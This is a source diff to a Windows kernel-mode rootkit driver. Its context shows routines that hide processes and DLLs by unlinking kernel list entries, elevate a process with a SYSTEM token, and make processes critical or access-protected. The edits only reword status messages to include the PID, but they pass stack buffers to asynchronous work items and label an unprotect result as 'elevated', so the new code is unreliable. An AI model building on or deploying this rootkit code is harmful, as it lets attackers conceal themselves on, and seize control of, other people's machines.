@@ -1,4 +1,5 @@
 #include "externs.h"
+#include <ntstrsafe.h>
 #include <wdm.h>
 #include "WindowsTypes.hpp"
 #pragma warning(push)
@@ -178,7 +179,7 @@ NTSTATUS ProtectProcess(UINT32 PID) {
    if (!NT_SUCCESS(status)) {
        debug_print("[-] Failed to query information process.. Returning.\n");
        if (workItem) {
-           IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Failed to query information process.. Returning.");
+           IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Failed to query information process.. Returning from ProtectProcess.");
        }
        else {
            debug_print("[-] Work Item could not be initialized.\n");
@@ -186,7 +187,11 @@ NTSTATUS ProtectProcess(UINT32 PID) {
        return status;
    }
    if (check == 1 && workItem) {
-       IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] This process is already protected (critical).");
+       char buf[256];
+       status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d is already critical.", PID);
+       if (NT_SUCCESS(status)) {
+           IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+       }
        return status;
    }
 #endif
@@ -199,7 +204,11 @@ NTSTATUS ProtectProcess(UINT32 PID) {
 #ifdef DL
    if (workItem) {  
        debug_print("[+] Work Item Called!\n");  
-       IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been protected successfully.");
+       char buf[256];
+       status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been protected successfully", PID);
+       if (NT_SUCCESS(status)) {
+           IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+       }
    } else {  
        debug_print("[-] Work Item could not be initialized.\n");  
    }  
@@ -235,7 +244,11 @@ NTSTATUS UnProtectProcess(UINT32 PID) {
 #ifdef DL
     status = ZwQueryInformationProcess(hProcess, ProcessBreakOnTermination, &check, sizeof(ULONG), 0);
     if (check == 0 && workItem) {
-        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Process wasn't protected (marked as critical), nothing changed.");
+        char buf[256];
+        status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d is not critical, nothing changed.", PID);
+        if (NT_SUCCESS(status)) {
+            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+        }
     }
 #endif
     status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
@@ -247,7 +260,11 @@ NTSTATUS UnProtectProcess(UINT32 PID) {
     DbgPrint("[+] Process with PID: %d is no longer protected, termination will not result a blue screen.\n", PID);
 #ifdef DL
     if (workItem) {
-        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been unprotected successfully.");
+        char buf[256];
+        status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been unprotected successfully", PID);
+        if (NT_SUCCESS(status)) {
+            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+        }
     }
 #endif
     return status;
@@ -371,7 +388,11 @@ VOID HideDLL(UINT32 PID, const WCHAR* DLLName) {
         RtlZeroMemory(entry->BaseDllName.Buffer, sizeof(entry->BaseDllName.Buffer));
         debug_print("[+] Successfully hidden the DLL from the process!\n");
 #ifdef DL
-        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Successfully hidden the DLL from the process!.");
+        char buf[256];
+        status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] DLL \"%ws\" has been successfully hidden from process %d.", DLLName, PID);
+        if (NT_SUCCESS(status)) {
+            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+        }
 #endif
     }
     else {
@@ -431,7 +452,12 @@ VOID HideProcess(UINT32 PID) {
         FlinkBlinkHide(CurrentList);
         debug_print("[+] Process is now hidden.\n");
 #ifdef DL
-        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been hidden successfully.");
+        char buf[256];
+        NTSTATUS status;
+        status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been hidden successfully", PID);
+        if (NT_SUCCESS(status)) {
+            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+        }
 #endif
         return;
     }
@@ -454,7 +480,12 @@ VOID HideProcess(UINT32 PID) {
             FlinkBlinkHide(CurrentList);
             debug_print("[+] Process is now hidden.\n");
 #ifdef DL
-            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been hidden successfully.");
+            NTSTATUS status1;
+            char buf[256];
+            status1 = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been hidden successfully", PID);
+            if (NT_SUCCESS(status1)) {
+                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+            }
 #endif
             return;
         }
@@ -513,7 +544,11 @@ NTSTATUS ElevateProcess(UINT32 PID) {
         debug_print("[+] Successfully elevated process using SYSTEM token.\n");
         debug_print("--------------------------------------------------------\n");
 #ifdef DL
-        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been elevated successfully.");
+        char buf[256];
+        status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been elevated successfully", PID);
+        if (NT_SUCCESS(status)) {
+            IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+        }
 #endif
         return STATUS_SUCCESS;
     }
@@ -700,7 +735,11 @@ namespace Rootkit {
         case codes::ProtectProcessOP:
             if (protectedPidIndex < MAX_PIDS) {
                 protectedPid[protectedPidIndex++] = HandleToUlong(pid);
-                IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[+] Process has been protected successfully. (ACCESS_DENIED Protection)");
+                char buf[256];
+                status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been protected successfully (ACCESS_DENIED Protection)", (int)HandleToUlong(pid));
+                if (NT_SUCCESS(status)) {
+                    IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+                }
             }
             else {
                 IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)"[-] Protected PID list is full.");
@@ -726,11 +765,11 @@ namespace Rootkit {
 
             if (workItem != NULL) {
                 if (found) {
-                    IoQueueWorkItem(workItem,
-                        MsgClientWorkerRoutine,
-                        DelayedWorkQueue,
-                        (PVOID)"[+] Process has been unprotected successfully. (ACCESS_DENIED Protection)"
-                    );
+                    char buf[256];
+                    status = RtlStringCbPrintfA(buf, sizeof(buf), "[+] Process with PID: %d has been elevated successfully", (int)HandleToUlong(pid));
+                    if (NT_SUCCESS(status)) {
+                        IoQueueWorkItem(workItem, MsgClientWorkerRoutine, DelayedWorkQueue, (PVOID)buf);
+                    }
                 }
                 else {
                     IoQueueWorkItem(workItem,
